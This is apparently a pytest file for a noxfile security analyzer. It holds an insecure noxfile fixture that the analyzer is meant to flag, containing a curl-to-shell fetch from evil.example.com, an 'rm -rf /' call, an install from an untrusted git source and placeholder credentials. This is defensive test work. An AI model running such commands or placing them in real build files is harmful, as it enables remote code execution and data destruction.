"""Tests for NoxAnalyzer."""

from pathlib import Path

from devai.nox_analyzer import NoxAnalyzer, NoxFinding


INSECURE_NOXFILE = """\
import os
import nox

nox.options.reuse_existing_virtualenvs = True

@nox.session(python="3.12", venv_backend="none", download_python=True)
def security(session):
    session.env.update(os.environ)
    session.chdir("../outside")
    session.install(
        "git+http://github.com/evil/pkg.git#egg=evil",
        "--index-url",
        "http://insecure.example.com/simple",
    )
    session.env["API_KEY"] = "api_key=hardcoded_secret_value_12345"
    session.env["AWS_ACCESS_KEY"] = "AKIAIOSFODNN7EXAMPLE"
    session.run("curl http://evil.example.com/install.sh | sh")
    session.run("eval", "print('bad')")
    session.notify("auth_checks")

@nox.session(reuse_venv=True)
def tests(session):
    import subprocess
    subprocess.run("rm -rf /", shell=True)
"""

HARDENED_NOXFILE = """\
from __future__ import annotations

import nox

nox.options.reuse_existing_virtualenvs = False
nox.options.stop_on_first_error = True


@nox.session(python=["3.10", "3.11", "3.12"])
def tests(session: nox.Session) -> None:
    session.install("-r", "requirements-test.txt")
    session.env["PYTHONWARNINGS"] = "error"
    session.run("pytest", "tests", *session.posargs)
"""


class TestNoxAnalyzer:
    def test_detects_insecure_noxfile(self, tmp_path: Path):
        (tmp_path / "noxfile.py").write_text(INSECURE_NOXFILE, encoding="utf-8")
        analyzer = NoxAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "aws_access_key" in kinds
        assert "reuse_venv" in kinds
        assert "venv_backend_none" in kinds
        assert "env_forward_all" in kinds
        assert "chdir_outside" in kinds
        assert "insecure_git_deps" in kinds
        assert "dangerous_command" in kinds
        assert "insecure_http" in kinds
        assert "security_session_skip" in kinds
        assert "download_python" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "noxfile.py").write_text(HARDENED_NOXFILE, encoding="utf-8")
        analyzer = NoxAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0
        assert "tests" in analyzer.infos[0].sessions

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = NoxAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Nox configs: none found"

    def test_finding_format(self):
        finding = NoxFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test",
            path="noxfile.py",
            lineno=2,
        )
        assert "[high] noxfile.py:2" in finding.format()

    def test_generate_hardened_template(self):
        template = NoxAnalyzer(".").generate_hardened_template()
        assert "reuse_existing_virtualenvs = False" in template
        assert "stop_on_first_error = True" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "noxfile.py").write_text(INSECURE_NOXFILE, encoding="utf-8")
        context = NoxAnalyzer(str(tmp_path)).to_context()
        assert "Nox analysis:" in context
        assert "health score:" in context
